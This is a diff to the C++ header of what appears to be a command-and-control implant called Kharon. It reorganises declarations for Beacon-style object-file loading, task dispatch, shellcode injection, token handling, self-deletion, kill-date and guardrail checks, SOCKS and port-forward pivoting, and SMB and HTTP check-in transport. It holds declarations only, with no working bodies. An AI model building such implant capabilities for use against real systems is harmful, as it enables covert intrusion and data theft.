@@ -304,6 +304,7 @@ namespace Root {
             DECLAPI( printf );
             DECLAPI( vprintf );
             DECLAPI( vsnprintf );
+            DECLAPI( k_vscwprintf );
             DECLAPI( k_vswprintf );
             DECLAPI( k_swprintf );
             DECLAPI( wcscat );
@@ -314,6 +315,7 @@ namespace Root {
             RSL_TYPE( printf ),
             RSL_TYPE( vprintf ),
             RSL_TYPE( vsnprintf ),
+            RSL_TYPE( k_vscwprintf ),
             RSL_TYPE( k_vswprintf ),
             RSL_TYPE( k_swprintf ),
             RSL_TYPE( wcscat ),
@@ -943,6 +945,7 @@ public:
         UPTR R15;          // 0x78
 
         UPTR ArgCount;     // 0x80
+        UPTR OriginalRsp;  // 0x88  
     } Setup = {
         .First { 
             .Ptr = (UPTR)this->Self->Ntdll.RtlUserThreadStart + 0x21
@@ -1009,7 +1012,7 @@ public:
     struct {
         UPTR  Hash;
         PVOID Ptr;
-    } ApiTable[35] = {        
+    } ApiTable[35] = {
         ApiTable[0]  = { Hsh::Str("BeaconDataParse"),   reinterpret_cast<PVOID>(&Coff::DataParse) },
         ApiTable[1]  = { Hsh::Str("BeaconDataInt"),     reinterpret_cast<PVOID>(&Coff::DataInt) },
         ApiTable[2]  = { Hsh::Str("BeaconDataExtract"), reinterpret_cast<PVOID>(&Coff::DataExtract) },
@@ -1042,8 +1045,6 @@ public:
         ApiTable[25] = { Hsh::Str("BeaconFormatReset"),    reinterpret_cast<PVOID>(&Coff::FmtReset) },
         ApiTable[26] = { Hsh::Str("BeaconFormatToString"), reinterpret_cast<PVOID>(&Coff::FmtToString) },
 
-        ApiTable[27] = { Hsh::Str("BeaconPkgCreate"),  reinterpret_cast<PVOID>(&Coff::PkgCreate) },
-        ApiTable[28] = { Hsh::Str("BeaconPkgDestroy"), reinterpret_cast<PVOID>(&Coff::PkgDestroy) },
         ApiTable[29] = { Hsh::Str("BeaconPkgBytes"),   reinterpret_cast<PVOID>(&Coff::PkgBytes) },
         ApiTable[30] = { Hsh::Str("BeaconPkgInt8"),    reinterpret_cast<PVOID>(&Coff::PkgInt8) },
         ApiTable[31] = { Hsh::Str("BeaconPkgInt16"),   reinterpret_cast<PVOID>(&Coff::PkgInt16) },
@@ -1108,13 +1109,13 @@ public:
         LPTHREAD_START_ROUTINE Start, LPVOID Parameter, DWORD Flags, LPDWORD ThreadId
     ) -> HANDLE;
 
-    static auto PkgCreate( _In_ ULONG CommandId, _In_ CHAR* UUID, _Out_ PACKAGE* Package ) -> VOID;
+    static auto PkgCreate( _Out_ PACKAGE* Package ) -> VOID;
     static auto PkgDestroy( _In_ PACKAGE* Package ) -> VOID;
-    static auto PkgInt8( _In_ PACKAGE* Package, _In_ BYTE Data ) -> VOID;
-    static auto PkgInt16( _In_ PACKAGE* Package, _In_ INT16 Data ) -> VOID;
-    static auto PkgInt32( _In_ PACKAGE* Package, _In_ INT32 Data ) -> VOID;
-    static auto PkgInt64( _In_ PACKAGE* Package, _In_ INT32 Data ) -> VOID;
-    static auto PkgBytes( _In_ PACKAGE* Package, _In_ PBYTE Buffer, _In_ ULONG Length ) -> VOID;
+    static auto PkgInt8( _In_ BYTE Data ) -> VOID;
+    static auto PkgInt16( _In_ INT16 Data ) -> VOID;
+    static auto PkgInt32( _In_ INT32 Data ) -> VOID;
+    static auto PkgInt64( _In_ INT32 Data ) -> VOID;
+    static auto PkgBytes( _In_ PBYTE Buffer, _In_ ULONG Length ) -> VOID;
 
     static auto AddValue( _In_ PCCH key, _In_ PVOID ptr ) -> BOOL;
     static auto GetValue( _In_ PCCH key ) -> PVOID;
@@ -1183,40 +1184,19 @@ public:
     CHAR* CurrentUUID  = nullptr;
     ULONG CurrentCmdId = 0;
     ULONG CurrentSubId = 0;
-
-    auto Create(
-        _In_ CHAR*   UUID, 
-        _In_ PARSER* Parser,
-        _In_ BOOL    IsResponse = FALSE
-    ) -> JOBS*;
     
-    auto Send( 
-        _In_ PACKAGE* PostJobs 
-    ) -> VOID;
-
-    auto GetAll(
-        VOID
-    ) -> VOID;
-
     auto ExecuteAll( VOID ) -> LONG;
-    
-    auto static Execute(
-        _In_ JOBS* Job
-    ) -> ERROR_CODE;
-    
-    auto GetByUUID(
-        _In_ CHAR* UUID
-    ) -> JOBS*;
-    
-    auto GetByID(
-        _In_ ULONG ID
-    ) -> JOBS*;
+    auto static Execute( _In_ JOBS* Job ) -> ERROR_CODE;
+
+    auto Send( _In_ PACKAGE* PostJobs ) -> VOID;
+    auto Create( _In_ CHAR* UUID, _In_ PARSER* Parser, _In_ BOOL IsResponse = FALSE ) -> JOBS*;
+
+    auto GetAll( VOID ) -> VOID;
+    auto GetByID( _In_ ULONG ID ) -> JOBS*;
+    auto GetByUUID( _In_ CHAR* UUID ) -> JOBS*;
+    auto Remove( _In_ JOBS* Job ) -> BOOL;
 
     auto Cleanup( VOID ) -> VOID;
-    
-    auto Remove(
-        _In_ JOBS* Job
-    ) -> BOOL;
 };
 
 class Useful {
@@ -1225,67 +1205,21 @@ private:
 public:
     Useful( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
-    auto ValidGranMem( HANDLE ProcessHandle, ULONG GranCount ) -> PVOID;
-
-    auto CfgAddrAdd( 
-        _In_ PVOID ImageBase,
-        _In_ PVOID Function
-    ) -> VOID;
-
-    auto CfgPrivAdd(
-        _In_ HANDLE hProcess,
-        _In_ PVOID  Address,
-        _In_ DWORD  Size
-    ) -> VOID;
+    auto CfgAddrAdd( _In_ PVOID ImageBase, _In_ PVOID Function ) -> VOID;
+    auto CfgPrivAdd( _In_ HANDLE hProcess, _In_ PVOID  Address, _In_ DWORD  Size ) -> VOID;
 
     auto CfgCheck( VOID ) -> BOOL;
-
     auto Guardrails( VOID ) -> BOOL;
     auto CheckWorktime( VOID ) -> BOOL;
 
-    auto FindGadget(
-        _In_ UPTR   ModuleBase,
-        _In_ UINT16 RegValue
-    ) -> UPTR;
+    auto FindGadget( _In_ UPTR ModuleBase, _In_ UINT16 RegValue ) -> UPTR;
 
-    auto SecVa(
-        _In_ UPTR LibBase,
-        _In_ UPTR SecHash
-    ) -> ULONG;
+    auto SecVa( _In_ UPTR LibBase, _In_ UPTR SecHash ) -> ULONG;
+    auto SecSize( _In_ UPTR LibBase, _In_ UPTR SecHash ) -> ULONG;
 
-    auto SecSize(
-        _In_ UPTR LibBase,
-        _In_ UPTR SecHash
-    ) -> ULONG;
-
-    auto NtStatusToError(
-        _In_ NTSTATUS NtStatus
-    ) -> ERROR_CODE;
-
+    auto NtStatusToError( _In_ NTSTATUS NtStatus ) -> ERROR_CODE;
     auto SelfDelete( VOID ) -> BOOL;
-    
     auto CheckKillDate( VOID ) -> VOID;
-
-    auto FixRel(
-        _In_ PVOID Base,
-        _In_ UPTR  Delta,
-        _In_ IMAGE_DATA_DIRECTORY* DataDir
-    ) -> VOID;
-
-    auto FixExp(
-        _In_ PVOID Base,
-        _In_ IMAGE_DATA_DIRECTORY* DataDir
-    ) -> VOID;
-
-    auto FixTls(
-        _In_ PVOID Base,
-        _In_ IMAGE_DATA_DIRECTORY* DataDir
-    ) -> VOID;
-
-    auto FixImp(
-        _In_ PVOID Base,
-        _In_ IMAGE_DATA_DIRECTORY* DataDir
-    ) -> BOOL;
 };
 
 class Package {
@@ -1295,144 +1229,35 @@ private:
 public:
     Package( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
-    PPACKAGE Shared = nullptr;
+    PACKAGE* Shared = nullptr;
 
-    auto Base32W(
-        _In_      const PVOID in,
-        _In_      SIZE_T inlen,
-        _Out_opt_ PVOID  out,
-        _In_opt_  SIZE_T outlen,
-        _In_      Base32Action Action
-    ) -> SIZE_T;
+    auto Base64( _In_ const PVOID in, _In_ SIZE_T inlen, _Out_opt_ PVOID  out, _In_opt_ SIZE_T outlen, _In_ Base64Action Action  ) -> SIZE_T;
+    auto Base32( _In_ const PVOID in, _In_ SIZE_T inlen, _Out_opt_ PVOID out, _In_opt_ SIZE_T outlen, _In_ Base32Action Action ) -> SIZE_T;
+    auto Base64URL( _In_      const PVOID in, _In_      SIZE_T inlen, _Out_opt_ PVOID  out, _In_opt_  SIZE_T outlen, _In_      Base64URLAction Action ) -> SIZE_T;
+    auto Hex( _In_ const PVOID in, _In_ SIZE_T inlen, _Out_opt_ PVOID out, _In_opt_ SIZE_T outlen, _In_ HexAction Action ) -> SIZE_T;
 
-    auto HexW(
-        _In_      const PVOID in,
-        _In_      SIZE_T inlen,
-        _Out_opt_ PVOID  out,
-        _In_opt_  SIZE_T outlen,
-        _In_      HexAction Action
-    ) -> SIZE_T;
-
-    auto Base64W(
-        _In_      const PVOID in,
-        _In_      SIZE_T inlen,
-        _Out_opt_ PVOID  out,
-        _In_opt_  SIZE_T outlen,
-        _In_      Base64Action Action
-    ) -> SIZE_T;
-
-    auto Base64URLW(
-        _In_      const PVOID in,
-        _In_      SIZE_T inlen,
-        _Out_opt_ PVOID  out,
-        _In_opt_  SIZE_T outlen,
-        _In_      Base64URLAction Action
-    ) -> SIZE_T;
-
-    auto Base64(
-        _In_      const PVOID in,
-        _In_      SIZE_T inlen,
-        _Out_opt_ PVOID  out,
-        _In_opt_  SIZE_T outlen,
-        _In_      Base64Action Action 
-    ) -> SIZE_T;
-
-    auto Base32(
-        _In_      const PVOID in,
-        _In_      SIZE_T inlen,
-        _Out_opt_ PVOID  out,
-        _In_opt_  SIZE_T outlen,
-        _In_      Base32Action Action
-    ) -> SIZE_T;
-
-    auto Base64URL(
-        _In_      const PVOID in,
-        _In_      SIZE_T inlen,
-        _Out_opt_ PVOID  out,
-        _In_opt_  SIZE_T outlen,
-        _In_      Base64URLAction Action
-    ) -> SIZE_T;
-
-    auto Hex(
-        _In_      const PVOID in,
-        _In_      SIZE_T inlen,
-        _Out_opt_ PVOID  out,
-        _In_opt_  SIZE_T outlen,
-        _In_      HexAction Action
-    ) -> SIZE_T;
-
-    auto SendOut(
-        _In_ ULONG Type,
-        _In_ ULONG CmdID,
-        _In_ BYTE* Buffer,
-        _In_ INT32 Length
-    ) -> BOOL;
-
-    auto FmtMsg(
-        _In_ ULONG Type,
-        _In_ CHAR* Message,
-        ...    
-    ) -> BOOL;
-    
-    auto SendMsgA(
-        _In_ ULONG Type,
-        _In_ CHAR* Message
-    ) -> BOOL;
-
-    auto SendMsgW(
-        _In_ ULONG  Type,
-        _In_ WCHAR* Message
-    ) -> BOOL;
+    auto SendOut( _In_ ULONG Type, _In_ ULONG CmdID, _In_ BYTE* Buffer, _In_ INT32 Length ) -> BOOL;
+    auto FmtMsg( _In_ ULONG Type, _In_ CHAR* Message, ... ) -> BOOL;
+    auto SendMsgA( _In_ ULONG Type, _In_ CHAR* Message ) -> BOOL;
+    auto SendMsgW( _In_ ULONG Type, _In_ WCHAR* Message ) -> BOOL;
 
     auto Int16( _In_ PPACKAGE Package, _In_ INT16 dataInt ) -> VOID;
     auto Int32( _In_ PPACKAGE Package, _In_ INT32 dataInt ) -> VOID;
     auto Int64( _In_ PPACKAGE Package, _In_ INT64 dataInt ) -> VOID;
     auto Pad( _In_ PPACKAGE Package, _In_ PUCHAR Data, _In_ SIZE_T Size ) -> VOID;
     auto Bytes( _In_ PPACKAGE Package, _In_ PUCHAR Data, _In_ SIZE_T Size ) -> VOID;
+    auto Str( _In_ PPACKAGE package, _In_ PCHAR data ) -> VOID;
+    auto Wstr( _In_ PPACKAGE package, _In_ PWCHAR data ) -> VOID;
+    auto Byte( _In_ PPACKAGE Package, _In_ BYTE dataInt ) -> VOID;
 
-    auto Byte( _In_ PPACKAGE Package, _In_ BYTE     dataInt 
-    ) -> VOID;
+    auto Create( _In_ ULONG CommandID, _In_ PCHAR UUID ) -> PPACKAGE;
+    auto PostJobs( VOID ) -> PPACKAGE;
+    auto NewTask( VOID ) -> PPACKAGE;
+    auto Checkin( VOID ) -> PPACKAGE;
+    auto Destroy( _In_ PACKAGE* Package  ) -> VOID;
+    auto Transmit( _In_ PACKAGE* Package, _Out_ PVOID* Response, _Out_ UINT64* Size ) -> BOOL;
 
-    auto Create( 
-        _In_ ULONG CommandID,
-        _In_ PCHAR UUID
-    ) -> PPACKAGE;
-
-    auto PostJobs(
-        VOID
-    ) -> PPACKAGE;
-
-    auto NewTask( 
-        VOID
-    ) -> PPACKAGE;
-
-    auto Checkin(
-        VOID
-    ) -> PPACKAGE;
-
-    auto Destroy( 
-        _In_ PPACKAGE Package 
-    ) -> VOID;
-
-    auto Transmit( 
-        _In_  PPACKAGE Package, 
-        _Out_ PVOID*   Response, 
-        _Out_ PUINT64  Size 
-    ) -> BOOL;
-
-    auto Error(
-        _In_ ULONG ErrorCode
-    ) -> VOID;
-
-    auto Str( 
-        _In_ PPACKAGE package, 
-        _In_ PCHAR    data 
-    ) -> VOID;
-
-    auto Wstr( 
-        _In_ PPACKAGE package, 
-        _In_ PWCHAR   data 
-    ) -> VOID;
+    auto Error( _In_ ULONG ErrorCode ) -> VOID;
 };
 
 class Parser {
@@ -1444,57 +1269,18 @@ public:
     BOOL    Endian = FALSE;
     PPARSER Shared = nullptr;
 
-    auto NewTask( 
-        _In_ PPARSER parser, 
-        _In_ PVOID   Buffer, 
-        _In_ UINT64  size 
-    ) -> VOID;
+    auto NewTask( _In_ PPARSER parser, _In_ PVOID Buffer, _In_ UINT64 size ) -> VOID;
+    auto New( _In_ PPARSER parser, _In_ PVOID Buffer, _In_ UINT64 size ) -> VOID;
+    auto Destroy( _In_ PPARSER Parser ) -> BOOL;   
 
-    auto New( 
-        _In_ PPARSER parser, 
-        _In_ PVOID   Buffer, 
-        _In_ UINT64  size 
-    ) -> VOID;
-
-    auto Pad(
-        _In_  PPARSER parser,
-        _Out_ ULONG size
-    ) -> BYTE*;
-
-    auto Byte(
-        _In_ PPARSER Parser
-    ) -> BYTE;
-
-    auto Int16(
-        _In_ PPARSER Parser
-    ) -> INT16;
-
-    auto Int32(
-        _In_ PPARSER Parser
-    ) -> INT32;
-
-    auto Int64(
-        _In_ PPARSER Parser
-    ) -> INT64;
-
-    auto Bytes(
-        _In_  PPARSER parser,
-        _Out_ ULONG*  size
-    ) -> BYTE*;
-
-    auto Str( 
-        _In_ PPARSER parser, 
-        _In_ ULONG*  size 
-    ) -> PCHAR;
-
-    auto Wstr(
-        _In_ PPARSER parser, 
-        _In_ ULONG*  size 
-    ) -> PWCHAR;
-
-    auto Destroy(
-        _In_ PPARSER Parser 
-    ) -> BOOL;   
+    auto Pad( _In_ PPARSER parser, _Out_ ULONG size ) -> BYTE*;
+    auto Byte( _In_ PPARSER Parser ) -> BYTE;
+    auto Int16( _In_ PPARSER Parser ) -> INT16;
+    auto Int32( _In_ PPARSER Parser ) -> INT32;
+    auto Int64( _In_ PPARSER Parser ) -> INT64;
+    auto Bytes( _In_  PPARSER parser, _Out_ ULONG*  size ) -> BYTE*;
+    auto Str( _In_ PPARSER parser, _In_ ULONG* size ) -> PCHAR;
+    auto Wstr( _In_ PPARSER parser, _In_ ULONG* size ) -> PWCHAR;
 };
 
 class Transport {    
@@ -1547,10 +1333,14 @@ public:
 
     auto CleanupHttpContext( HTTP_CONTEXT* Ctx ) -> BOOL;
 
-    auto PrepareUrlAndMethod(
-        _In_  HTTP_CONTEXT*   Ctx,
+    auto PrepareUrl(
+        _In_ HTTP_CONTEXT*   Ctx,
+        _In_ HTTP_CALLBACKS* Callback,
+        _In_ BOOL            Secure
+    ) -> BOOL;
+
+    auto PrepareMethod(
         _In_  HTTP_CALLBACKS* Callback,
-        _In_  BOOL            Secure,
         _Out_ WCHAR**         OutMethodStr,
         _Out_ HTTP_METHOD*    OutMethod
     ) -> BOOL;
@@ -1624,42 +1414,16 @@ public:
 #endif
     };
 
-    auto SmbAdd(
-        _In_ CHAR* NamedPipe,
-        _In_ PVOID Parser,
-        _In_ PVOID Package
-    ) -> PVOID;
+    auto Checkin( VOID ) -> BOOL;
 
-    auto SmbRm(
-        _In_ PVOID SmbData
-    ) -> BOOL;
+    auto SmbAdd( _In_ CHAR* NamedPipe, _In_ PVOID Parser, _In_ PVOID Package ) -> PVOID;
+    auto SmbRm( _In_ PVOID SmbData ) -> BOOL;
+    auto SmbGet( _In_ CHAR* SmbUUID ) -> PVOID;
+    auto SmbList( VOID ) -> PVOID;
 
-    auto SmbGet(
-        _In_ CHAR* SmbUUID
-    ) -> PVOID;
-
-    auto SmbList(
-        VOID
-    ) -> PVOID;
-
-    auto Checkin(
-        VOID
-    ) -> BOOL;
-
-    auto Send(
-        _In_      MM_INFO* SendData,
-        _Out_opt_ MM_INFO* RecvData
-    ) -> BOOL;
-
-    auto SmbSend(
-        _In_      MM_INFO* SendData,
-        _Out_opt_ MM_INFO* RecvData
-    ) -> BOOL;
-
-    auto HttpSend(
-        _In_      MM_INFO* SendData,
-        _Out_opt_ MM_INFO* RecvData
-    ) -> BOOL;
+    auto Send( _In_ MM_INFO* SendData, _Out_opt_ MM_INFO* RecvData ) -> BOOL;
+    auto SmbSend( _In_ MM_INFO* SendData, _Out_opt_ MM_INFO* RecvData ) -> BOOL;
+    auto HttpSend( _In_ MM_INFO* SendData, _Out_opt_ MM_INFO* RecvData ) -> BOOL;
 };
 
 class Task {
@@ -1670,78 +1434,29 @@ public:
 
     BOOL HasTask;
 
-    auto Dispatcher( 
-        VOID 
-    ) -> VOID;
+    auto Dispatcher( VOID  ) -> VOID;
 
-    auto ScInject(
-        _In_ JOBS* Job
-    ) -> ERROR_CODE;
+    auto Token( _In_ JOBS* Job ) -> ERROR_CODE;
+    auto SelfDel( _In_ JOBS* Job ) -> ERROR_CODE;
+    auto Download( _In_ JOBS* Job ) -> ERROR_CODE;
+    auto Upload( _In_ JOBS* Job ) -> ERROR_CODE;
 
-    auto Token(
-        _In_ JOBS* Job
-    ) -> ERROR_CODE;
+    auto Pivot( _In_ JOBS* Job ) -> ERROR_CODE;
 
-    auto SelfDel(
-        _In_ JOBS* Job
-    ) -> ERROR_CODE;
+    auto Config( _In_ JOBS* Job ) -> ERROR_CODE;
+    auto ExecBof( _In_ JOBS* Job ) -> ERROR_CODE;
+    auto Exit( _In_ JOBS* Job ) -> ERROR_CODE;
+    auto Jobs( _In_ JOBS* Job ) -> ERROR_CODE;
 
-    auto Download(
-        _In_ JOBS* Job
-    ) -> ERROR_CODE;
-    
-    auto Upload(
-        _In_ JOBS* Job
-    ) -> ERROR_CODE;
-
-    auto Pivot( 
-        _In_ JOBS* Job
-    ) -> ERROR_CODE;
-
-    auto Socks( 
-        _In_ JOBS* Job
-    ) -> ERROR_CODE;
-
-    auto Config( 
-        _In_ JOBS* Job
-    ) -> ERROR_CODE;
-
-    auto Process( 
-        _In_ JOBS* Job
-    ) -> ERROR_CODE;
-
-    auto FileSystem( 
-        _In_ JOBS* Job
-    ) -> ERROR_CODE;
-
-    auto ExecBof(
-        _In_ JOBS* Job
-    ) -> ERROR_CODE;
-
-    auto Exit(
-        _In_ JOBS* Job
-    ) -> ERROR_CODE;
-
-    auto Jobs(
-        _In_ JOBS* Job
-    ) -> ERROR_CODE;
-
-    auto Task::ProcessTunnel(
-    _In_ JOBS* Job
-    ) -> ERROR_CODE;
-
-    auto Task::ProcessDownloads(
-    _In_ JOBS* Job
-    ) -> ERROR_CODE;
-
-    auto Task::RPortfwd(
-        _In_ JOBS* Job
-    ) -> ERROR_CODE;
+    auto Socks( _In_ JOBS* Job ) -> ERROR_CODE;
+    auto ProcessTunnel( _In_ JOBS* Job ) -> ERROR_CODE;
+    auto ProcessDownloads( _In_ JOBS* Job ) -> ERROR_CODE;
+    auto RPortfwd( _In_ JOBS* Job ) -> ERROR_CODE;
 
     typedef auto ( Task::*TASK_FUNC )( JOBS* ) -> ERROR_CODE;
 
     struct {
-        ULONG        ID;
+        Action::Task ID;
         ERROR_CODE ( Task::*Run )( JOBS* );
     } Mgmt[TSK_LENGTH] = {
         Mgmt[0].ID  = Action::Task::Exit,              Mgmt[0].Run  = &Task::Exit,
@@ -1807,7 +1522,17 @@ public:
         CONTEXT* Ctx
     ) -> BOOL;
 
-    auto Create( _In_  HANDLE ProcessHandle, _In_  PVOID  StartAddress,
+    auto QueueAPC(
+        _In_     PVOID  CallbackFnc,
+        _In_     HANDLE ThreadHandle,
+        _In_opt_ PVOID  Argument1,
+        _In_opt_ PVOID  Argument2,
+        _In_opt_ PVOID  Argument3
+    ) -> LONG;
+
+    auto Create( 
+        _In_  HANDLE ProcessHandle, 
+        _In_  PVOID  StartAddress,
         _In_  PVOID  Parameter,
         _In_  ULONG  StackSize,
         _In_  ULONG  Flags,
@@ -1816,7 +1541,7 @@ public:
     ) -> HANDLE;
 
     auto Open( _In_ ULONG RightAccess, _In_ BOOL Inherit, _In_ ULONG ThreadID ) -> HANDLE;
-    auto Enum( _In_ INT8 Type, _In_opt_ ULONG ProcessID = 0, _Out_opt_ ULONG ThreadQtt = 0, _Out_opt_ PSYSTEM_THREAD_INFORMATION ThreadInfo = nullptr ) -> ULONG;
+    auto Enum( _In_ Action::Thread Type, _In_opt_ ULONG ProcessID = 0, _Out_opt_ ULONG ThreadQtt = 0, _Out_opt_ PSYSTEM_THREAD_INFORMATION ThreadInfo = nullptr ) -> ULONG;
 
     auto Rnd( VOID ) -> ULONG {
         return Enum( Action::Thread::Random, 0 );
